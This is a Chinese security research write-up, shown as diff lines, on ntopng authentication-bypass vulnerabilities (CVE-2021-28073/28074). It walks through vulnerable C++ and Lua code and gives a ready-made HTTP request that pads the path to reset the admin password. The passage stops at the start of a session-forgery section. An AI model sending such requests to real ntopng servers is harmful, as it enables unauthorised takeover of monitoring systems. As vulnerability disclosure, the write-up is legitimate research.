@@ -1,0 +1,118 @@
+**作者：Ricter Z@360高级攻防实验室  
+原文链接：**
+### 0x00. TL;DR
+ntopng 是一套开源的网络流量监控工具，提供基于 Web 界面的实时网络流量监控。支持跨平台，包括 Windows、Linux 以及
+MacOS。ntopng 使用 C++ 语言开发，其绝大部分 Web 逻辑使用 lua 开发。
+在针对 ntopng 的源码进行审计的过程中，笔者发现了 ntopng 存在多个漏洞，包括一个权限绕过漏洞、一个 SSRF
+漏洞和多个其他安全问题，接着组合利用这些问题成功实现了部分版本的命令执行利用和管理员 Cookie 伪造。
+比较有趣的是，利用的过程涉及到 SSDP 协议、gopher scheme 和奇偶数，还有极佳的运气成分。ntopng 已经针对这些漏洞放出补丁，并在
+4.2 版本进行修复。涉及漏洞的 CVE 如下：
+  * CVE-2021-28073
+  * CVE-2021-28074
+### 0x01. 部分权限绕过 (全版本)
+ntopng 的 Web 界面由 Lua 开发，对于 HTTP 请求的处理、认证相关的逻辑由后端 C++ 负责，文件为
+`HTTPserver.cpp`。对于一个 HTTP 请求来说，ntopng 的主要处理逻辑代码都在 `handle_lua_request` 函数中。其
+HTTP 处理逻辑流程如下：
+  1. 检测是不是某些特殊路径，如果是直接返回相关逻辑结束函数；
+  2. 检测是不是白名单路径，如果是则储存在 whitelisted 变量中；
+  3. 检测是否是静态资源，通过判断路径最后的扩展名，如果不是则进入认证逻辑，认证不通过结束函数；
+  4. 检测是否路径以某些特殊路径开头，如果是则调用 Lua 解释器，逻辑交由 Lua 层；
+  5. 以上全部通过则判断为静态文件，函数返回，交由 mongoose 处理静态文件。
+针对一个非白名单内的 lua 文件，是无法在通过认证之前到达的，因为无法通过判断是否是静态文件的相关逻辑。同时为了使我们传入的路径进入调用
+LuaEngine::handle_script_request 我们传入的路径需要以 `/lua/` 或者 `/plugins/`
+开头，以静态文件扩展名结尾，比如 `.css` 或者 `.js`。
+    // HTTPserver.cpp
+    if(!isStaticResourceUrl(request_info, len)) {
+        ...
+    }
+    if((strncmp(request_info->uri, "/lua/", 5) == 0)
+     || (strcmp(request_info->uri, "/metrics") == 0)
+     || (strncmp(request_info->uri, "/plugins/", 9) == 0)
+     || (strcmp(request_info->uri, "/") == 0)) {
+     ...
+    12345678910
+进入 if 语句后，ntopng 声明了一个 **大小为 255 的字符串数组** 来储存用户请求的文件路径。并针对以非 `.lua`
+扩展名结尾的路径后补充了 `.lua`，接着调用 stat 函数判断此路径是否存在。如果存在则调用
+`LuaEngine::handle_script_request` 来进行处理。
+    // HTTPserver.cpp
+    /* Lua Script */
+    char path[255] = { 0 }, uri[2048];
+    struct stat buf;
+    bool found;
+    ...
+    if(strlen(path) > 4 && strncmp(&path[strlen(path) - 4], ".lua", 4))
+        snprintf(&path[strlen(path)], sizeof(path) - strlen(path) - 1, "%s", 
+        (char*)".lua");
+    ntop->fixPath(path);
+    found = ((stat(path, &buf) == 0) && (S_ISREG(buf.st_mode))) ? true : false;
+    if(found) {
+        ...
+        l = new LuaEngine(NULL);
+        ...
+        l->handle_script_request(conn, request_info, path, &attack_attempt, username,
+                                 group, csrf, localuser);
+    1234567891011121314151617181920
+ntopng 调用 snprintf 将用户请求的 URI 写入到 path 数组中，而 snprintf 会在字符串结尾添加 `\0`。由于 path
+数组长度有限，即使用户传入超过 255 个字符的路径，也只会写入前 254 个字符，我们可以通过填充 `./` 来构造一个长度超过 255
+但是合法的路径，并利用长度限制来截断后面的 .css.lua，即可绕过 ntopng 的认证以访问部分 Lua 文件。
+目前有两个问题，一个是为什么只能用 `./` 填充，另外一个是为什么说是“部分 Lua 文件”。
+第一个问题，在 `thrid-party/mongoose/mongoose.c` 中，进行路径处理之前会调用下面的函数去除重复的 `/`以及
+`.`，导致我们只能用 `./` 来填充。
+    void remove_double_dots_and_double_slashes(char *s) {
+        char *p = s;
+        while (*s != '\0') {
+            *p++ = *s++;
+            if (s[-1] == '/' || s[-1] == '\\') {
+                // Skip all following slashes, backslashes and double-dots
+                while (s[0] != '\0') {
+                    if (s[0] == '/' || s[0] == '\\') {
+                        s++;
+                    } else if (s[0] == '.' && s[1] == '.') {
+                        s += 2;
+                    } else {
+                        break;
+                    }
+                }
+            }
+        }
+        *p = '\0';
+    }
+    1234567891011121314151617181920
+说部分 Lua 文件的原因为，由于我们只能利用两个字符 `./`
+来进行路径填充，。那么针对前缀长度为偶数的路径，我们只能访问路径长度为偶数的路径，反之亦然。因为一个偶数加一个偶数要想成为偶数必然需要再加一个偶数。也就是说，我们需要：
+    len("/path/to/ntopng/lua/") + len("./") * padding + len("path/to/file") = 255 - 1
+### 0x02. 全局权限绕过 (版本 4.1.x-4.3.x)
+其实大多数 ntopng 的安装路径都是偶数（/usr/share/ntopng/scripts/lua/），那么我们需要一个合适的 gadgets
+来使我们执行任意 lua 文件。通过对 lua 文件的审计，我发现 `modules/widgets_utils.lua`内存在一个合适的 gadgets：
+    // modules/widgets_utils.lua
+    function widgets_utils.generate_response(widget, params)
+       local ds = datasources_utils.get(widget.ds_hash)
+       local dirs = ntop.getDirs()
+       package.path = dirs.installdir .. "/scripts/lua/datasources/?.lua;" .. package.path
+       -- Remove trailer .lua from the origin
+       local origin = ds.origin:gsub("%.lua", "")
+       -- io.write("Executing "..origin..".lua\n")
+       --tprint(widget)
+       -- Call the origin to return
+       local response = require(origin)
+    1234567891011121314
+调用入口在 `widgets/widget.lua`，很幸运，这个文件名长度为偶数。通过阅读代码逻辑可知，我们需要在`edit_widgets.lua`
+创建一个 widget，而创建 widget 有需要存在一个 datasource，在 `edit_datasources.lua`
+创建。而这两个文件的文件名长度全部为偶数，所以我们可以利用请求这几个文件，从而实现任意文件包含的操作，从而绕过 ntopng 的认证。
+### 0x03. Admin 密码重置利用 (版本 2.x)
+利用 0x01 的认证绕过，请求 `admin/password_reset.lua` 即可更改管理员的密码。
+    GET /lua/.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f
+    .%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.
+    %2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%
+    2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2
+    f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f
+    .%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2fadmin/password_reset.lua.css?confirm_new_
+    password=123&new_password=123&old_password=0&username=admin HTTP/1.1
+    Host: 127.0.0.1:3000
+    Cookie: user=admin
+    Connection: close
+    12345678910
+### 0x04. 利用主机发现功能伪造 Session (版本 4.1.x-4.3.x)
+ntopng 的主机发现功能利用了 SSDP（Simple Service Discovery Protocol）协议去发现内网中的设备。
+SSDP 协议进行主机发现的流程如下所示：
+    +----------------------+
